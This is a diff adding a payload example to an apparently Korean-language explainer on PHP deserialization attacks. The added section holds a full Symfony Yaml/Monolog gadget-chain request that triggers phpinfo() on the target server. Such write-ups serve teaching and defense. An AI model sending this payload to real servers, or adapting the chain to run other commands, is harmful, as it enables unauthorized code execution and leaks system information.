@@ -4,7 +4,12 @@
 * **역직렬화된 객체가 악성 코드를 실행하거나 의도하지 않은 동작을 일으킬 수 있기 때문에 심각한 보안 위험을 초래할 수 있습니다.**
 * **PHP 함수 호출**: `phpinfo()`와 같은 함수가 호출될 수 있고, 이는 서버에 대한 중요한 시스템 정보를 노출시킬 수 있습니다. 이 정보를 이용해 더 큰 공격을 시도할 수 있습니다.
 
+---
+### 페이로드 예시
 
+```
+controller\=SymfonyComponentYamlInline::parse&value\=!!php/object:a:1:{i:1;a:2:{i:0;O:32:\"MonologHandlerSyslogUdpHandler\":1:{s:9:\"*socket\";O:29:\"MonologHandlerBufferHandler\":7:{s:10:\"*handler\";O:29:\"MonologHandlerBufferHandler\":7:{s:10:\"*handler\";N;s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:2:\"-1\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:7:\"phpinfo\";}}s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;i:-1;s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:7:\"phpinfo\";}}}i:0;i:0;}}&exceptionOnInvalidType\=0&objectSupport\=1&objectForMap\=0&flags\777215&references\=1
+```
 
 ### 이 공격의 작동 원리:
 
